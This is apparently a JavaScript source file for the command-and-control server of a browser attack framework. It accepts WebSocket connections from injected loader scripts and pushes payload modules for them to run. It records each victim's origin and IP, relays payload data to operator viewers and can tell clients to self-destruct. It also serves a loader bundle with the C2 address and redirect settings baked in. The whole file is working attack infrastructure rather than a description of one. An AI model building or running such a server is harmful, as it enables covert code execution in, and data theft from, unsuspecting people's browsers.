import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import express from "express";
import { WebSocketServer } from "ws";
import { decodeBinaryFrame } from "../shared/binary-frame.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/**
 * Creates the C2 (command-and-control) server.
 * Handles: payload WebSocket (/ws), loader serving (/payload.js/:linkId)
 * @param {ReturnType<import("./state.js").createState>} state
 * @returns {{ app: import("express").Application, server: import("http").Server }}
 */
export function createC2Server(state) {
  const { db, payloadHandlers, activeClients, storeLog } = state;

  const app = express();
  const server = http.createServer(app);
  const payloadWss = new WebSocketServer({ noServer: true });

  server.on("upgrade", (req, socket, head) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    if (url.pathname === "/ws") {
      payloadWss.handleUpgrade(req, socket, head, (ws) => {
        payloadWss.emit("connection", ws, req);
      });
    } else {
      socket.destroy();
    }
  });

  // Payload WebSocket: client loader connects here to receive and run payload modules
  payloadWss.on("connection", (ws, req) => {
    let clientId = null;
    // Extract IP from X-Forwarded-For header (reverse proxy) or the raw socket address.
    // Normalise IPv4-mapped IPv6 addresses (e.g. "::ffff:127.0.0.1" → "127.0.0.1").
    const rawIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
    const clientIp = rawIp.replace(/^::ffff:/i, '');

    ws.on("message", (data, isBinary) => {
      if (isBinary) {
        if (!clientId) return;
        // Decode binary frame: [1 byte: name length N][N bytes: name UTF-8][rest: data]
        const frame = decodeBinaryFrame(data);
        if (!frame) return;
        const { name, data: payload } = frame;

        const entry = activeClients.get(clientId);
        if (!entry) return;
        const handlerState = entry.payloads[name];
        const handler = payloadHandlers[name];
        if (!handlerState || !handler) return;

        handler.onBinary?.(handlerState, payload, () =>
          handler.pushToAllViewers(handlerState)
        );
        return;
      }

      // Text message
      const text = data.toString();
      let msg;
      try {
        msg = JSON.parse(text);
      } catch {
        return;
      }

      if (msg.type === "init") {
        // Handshake: { type: "init", clientId, linkId, origin }
        clientId = msg.clientId;
        const linkId = msg.linkId;
        const clientOrigin = msg.origin || '';
        const link = db.getLink(linkId);

        if (!link) {
          console.error(`Unknown link ID: ${linkId}`);
          ws.close();
          return;
        }

        // If this is a reconnecting client (has a persisted localStorage ID) and the server
        // has no record of it (e.g. deleted by the operator), tell it to destroy itself.
        if (msg.reconnect === true && !db.getClient(clientId)) {
          console.log(`Client ${clientId.slice(0, 8)} sent destroy (reconnect with unknown clientId)`);
          ws.send(JSON.stringify({ type: "destroy" }));
          ws.close();
          return;
        }

        // On first connect: INSERT OR IGNORE copies link payloads + config as the client's template.
        // On reconnect: no-op — the client's own persisted payloads and config are preserved.
        db.insertClient(clientId, linkId, link.payloads, link.config, clientOrigin, clientIp);
        // Always update the connection timestamp and refresh origin/IP (may change across reconnects)
        db.updateClientConnectedAt(clientId);
        db.updateClientOriginIp(clientId, clientOrigin, clientIp);

        // Use the client's own persisted payload config (not the link's current config)
        const client = db.getClient(clientId);
        const clientPayloads = client.payloads;
        const clientConfig = client.config || {};

        console.log(
          `Client ${clientId.slice(0, 8)} connected (link ${linkId.slice(0, 8)}, payloads: ${clientPayloads.join(", ")})`
        );

        storeLog(clientId, {
          level: "info",
          source: "server",
          message: `Client connected (link ${linkId.slice(0, 8)}, payloads: ${clientPayloads.join(", ")})`,
          timestamp: Date.now(),
        });

        // Register the client entry with an empty payloads map so loadPayloadOnClient can populate it.
        // Config delivery: initial per-payload config is sent inside each { type: "load" } message
        // (bootstrap path — no extra round trip). Live config updates from PATCH /api/clients/:id
        // arrive via { type: "payload", data: { type: "config" } } (runtime path). Payload authors
        // must handle both paths — see management.js PATCH handler for the runtime push.
        // onConnect is called inside loadPayloadOnClient — no separate loop needed.
        activeClients.set(clientId, { ws, payloads: {} });
        const isReconnect = msg.reconnect === true;
        for (const name of clientPayloads) {
          state.loadPayloadOnClient(clientId, name, clientConfig[name] || {}, { isReconnect });
        }
      } else if (msg.type === "loaded") {
        console.log(
          `  Client ${clientId?.slice(0, 8)} loaded payload: ${msg.name}`
        );
        if (clientId) {
          storeLog(clientId, {
            level: "info",
            source: "server",
            message: `Payload loaded: ${msg.name}`,
            timestamp: Date.now(),
          });
        }
      } else if (msg.type === "payload") {
        // Route to the appropriate payload handler
        if (!clientId) return;
        const entry = activeClients.get(clientId);
        if (!entry) return;
        const name = msg.name;
        const handlerState = entry.payloads[name];
        const handler = payloadHandlers[name];
        if (!handlerState || !handler) return;

        handler.onMessage?.(handlerState, msg.data, () =>
          handler.pushToAllViewers(handlerState)
        );
      } else if (msg.type === "log") {
        if (!clientId) return;
        storeLog(clientId, msg);
      }
    });

    ws.on("close", () => {
      if (clientId) {
        // Call optional onDisconnect hook for each payload handler before removing from
        // activeClients. Handlers can use this to notify viewers, flush data, etc.
        const entry = activeClients.get(clientId);
        if (entry) {
          for (const [name, handlerState] of Object.entries(entry.payloads)) {
            payloadHandlers[name]?.onDisconnect?.(handlerState);
          }
        }

        try { db.updateClientDisconnectedAt(clientId); } catch { /* DB may be closed during shutdown */ }
        storeLog(clientId, {
          level: "warn",
          source: "server",
          message: "Client disconnected",
          timestamp: Date.now(),
        });
        activeClients.delete(clientId);
        console.log(`Client ${clientId.slice(0, 8)} disconnected`);
      }
    });
  });

  // Serve the loader bundle with injected config variables for this link
  app.get("/payload.js/:linkId", (req, res) => {
    const linkId = req.params.linkId;
    const link = db.getLink(linkId);

    if (!link) {
      res.status(404).send("// unknown link ID");
      return;
    }

    const bundlePath = path.join(__dirname, "..", "dist", "loader.bundle.js");
    let bundle;
    try {
      bundle = fs.readFileSync(bundlePath, "utf-8");
    } catch {
      res.status(500).send("// loader not built yet — run: npm run build");
      return;
    }

    const port = server.address()?.port || 3001;
    const serverUrl = req.query.server || `ws://${req.hostname}:${port}/ws`;
    let prefix = `var __DV_SERVER__=${JSON.stringify(serverUrl)};var __DV_LINK_ID__=${JSON.stringify(linkId)};`;
    if (link.redirectUri) {
      prefix += `var __DV_REDIRECT__=${JSON.stringify(link.redirectUri)};`;
    }
    res.type("application/javascript").send(`${prefix}\n${bundle}`);
  });

  return { app, server };
}
